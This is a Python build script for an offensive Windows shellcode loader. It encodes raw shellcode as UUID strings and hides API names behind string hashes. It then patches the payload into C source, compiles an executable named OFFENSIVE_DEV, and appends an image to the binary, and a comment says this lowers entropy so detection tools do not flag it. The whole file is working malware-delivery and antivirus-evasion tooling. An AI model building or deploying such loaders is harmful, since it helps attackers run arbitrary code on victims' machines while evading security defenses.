import subprocess
import os
import re
import argparse
import uuid

# Constants
H_MAGIC_KEY = 5381
H_MAGIC_SEED = 5

# I need my colors
HEADER = '\033[95m'
BLUE = '\033[94m'
CYAN = '\033[96m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
RESET = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

# Status symbols
SUCCESS = f"{BOLD}{GREEN}[+]{RESET} "
EVENT = f"{BOLD}{CYAN}[*]{RESET} "
WARNING = f"{BOLD}{YELLOW}[!]{RESET} "
FAILURE = f"{BOLD}{RED}[-]{RESET} "

def hash_string( string ):
    hash = 5381

    for x in string.upper().encode():
        hash = (( hash << 5 ) + hash ) + x

    hash = hash & 0xFFFFFFFF
    print(f"    {EVENT} Hashed {string}->{hash}")
    return str(hash)


def convert_to_uuid(shellcode):
    if len(shellcode) % 16 != 0:
        print(f"{WARNING} Shellcode length is not a multiple of 16 bytes")
        print(f"{WARNING} Adding NOPS at the end of shellcode (this might break something!)")
        print(f"{EVENT} Modified shellcode length: ", len(shellcode) + (16 - (len(shellcode) % 16)))

        null_bytes = b"\x90" * (16 - (len(shellcode) % 16))
        shellcode += null_bytes

    uuids = []
    for i in range(0, len(shellcode), 16):
        uuid_as_string = str(uuid.UUID(bytes_le=shellcode[i:i + 16]))
        uuids.append('"' + uuid_as_string + '"')

    return uuids

def preprocess(uuids, file):
    with open(file, "r") as f:
        content = f.read()
    # Scuffed custom macro system because C macros can't do this...
    result = re.sub(r'HASH_STR\((.*?)\)', lambda match: hash_string(match.group(1).replace('"', "").strip()), content)

    if ("main.c" in file):
        print(f"{EVENT} Inserting payload in {file}")

        payload = "\tconst char* uuids[] = {"

        for uuid in uuids:
            payload += f"\n\t\t{uuid},"
        payload += "\t};"

        result = result.replace("const char* uuids[] = {};", payload)

    with open(file, "w") as file:
        file.write(result)

def main():
    parser = argparse.ArgumentParser(description="Patch shellcode into the C# loader as UUIDs")
    parser.add_argument("file", type=argparse.FileType("rb"), help="Path to shellcode (.bin)")
    parser.add_argument("--profile", choices=["debug", "release"], default="release", help="Which profile to use. Do not use debug on a target")
    args = parser.parse_args()

    with args.file as shellcode:
        uuids = convert_to_uuid(shellcode.read())

    print(f"{EVENT} Cleaning build directory")
    subprocess.run("rm -rf build/*; mkdir build/bin; mkdir build/bin/obj;", shell=True)
    print(f"{EVENT} Copying files")
    subprocess.run("cp -r src build; cp -r include build; cp -r asm build; cp Makefile build;", shell=True)

    print(f"{EVENT} Applying obfuscation")
    source_dir = "build/src"
    files = [f for f in os.listdir(source_dir) if os.path.isfile(os.path.join(source_dir, f))]

    for file in files:
        print(f"{EVENT} Patching {source_dir}/{file}")
        preprocess(uuids, f"{source_dir}/{file}")
        print(f"{SUCCESS} Patched {source_dir}/{file}")

    include_dir = "build/include"
    files = [f for f in os.listdir(include_dir) if os.path.isfile(os.path.join(include_dir, f))]

    for file in files:
        print(f"{EVENT} Patching {include_dir}/{file}")
        preprocess(uuids, f"{include_dir}/{file}")
        print(f"{EVENT} Patched {include_dir}/{file}")

    subprocess.run(f"cd build; PROFILE={args.profile} make", shell=True)

    # For some god unknown reason this messes with the entropy so it's not even marked as suspicious...
    subprocess.run("cat build/bin/OFFENSIVE_DEV.x64.exe resources/important.jpg > bin/loader.x64.exe;", shell=True)

    print(f"{EVENT} Compilation complete. Moving build files")

    subprocess.run("rm -rf build/*;", shell=True)

    print(f"{SUCCESS} Done!")

if __name__ == "__main__":
    main()